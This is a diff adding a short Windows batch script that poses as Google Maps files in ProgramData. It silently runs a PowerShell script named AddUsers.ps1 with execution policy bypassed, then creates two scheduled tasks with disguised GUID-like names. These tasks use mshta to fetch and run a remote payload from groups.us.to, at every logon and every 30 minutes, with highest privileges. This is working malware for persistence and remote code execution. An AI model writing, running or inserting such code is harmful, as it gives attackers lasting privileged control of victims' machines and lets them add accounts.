@@ -1,0 +1,6 @@
+cd C:\ProgramData\Google\Maps\
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\ProgramData\Google\Maps\AddUsers.ps1'"", 0:close")
+choice /n /c y /d y /t 3 > nul
+schtasks /create /tn "{8PTE-M84U-2OBU-T9QE-GP7E-W9FU}" /tr "C:\Windows\System32\mShTa.ExE http://groups.us.to:69/09.mp4" /SC ONLOGON /RL HIGHEST /F
+choice /n /c y /d y /t 3 > nul
+schtasks /create /tn "{KSIB-8KYY-T29Y-9KMG-B86I-GK6Y}" /tr "C:\Windows\System32\mShTa.ExE http://groups.us.to:69/09.mp4" /SC MINUTE /MO 30 /RL HIGHEST /F
